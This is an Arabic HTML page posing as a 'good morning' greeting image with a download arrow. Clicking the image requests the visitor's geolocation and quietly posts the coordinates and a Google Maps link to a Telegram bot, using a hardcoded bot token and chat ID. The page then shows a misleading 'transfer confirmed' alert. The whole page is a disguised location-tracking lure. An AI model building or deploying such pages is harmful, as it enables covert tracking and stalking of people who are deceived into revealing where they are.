<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>صباح الخير</title>
<style>
  body {
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background: #f2f2f2;
  }
  .image-wrapper {
    position: relative;
    width: 500px;
    height: 300px;
    cursor: pointer;
  }
  .image-wrapper img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    border-radius: 15px;
    filter: brightness(0.85); /* تمويه بسيط */
  }
  .download-arrow {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    font-size: 50px;
    color: #fff;
    opacity: 0.8;
    pointer-events: none;
  }
</style>
</head>
<body>

<div class="image-wrapper" onclick="getLocation()">
  <img src="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg" alt="صباح الخير">
  <div class="download-arrow">⬇️</div>
</div>

<script>
function sendLocationToBot(lat, lon) {
    const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
    const chatId = "6495557039";
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
    const message = `📍 موقع المستخدم:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(res => res.json())
    .then(data => console.log("✅ تم الإرسال:", data))
    .catch(err => console.error("❌ خطأ:", err));
}

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                sendLocationToBot(lat, lon);
                alert("✅ تم تأكيد التحويل!");
            },
            err => {
                alert("❌ لم يتم السماح بالوصول إلى الموقع");
            }
        );
    } else {
        alert("❌ جهازك لا يدعم الموقع الجغرافي");
    }
}
</script>

</body>
</html>
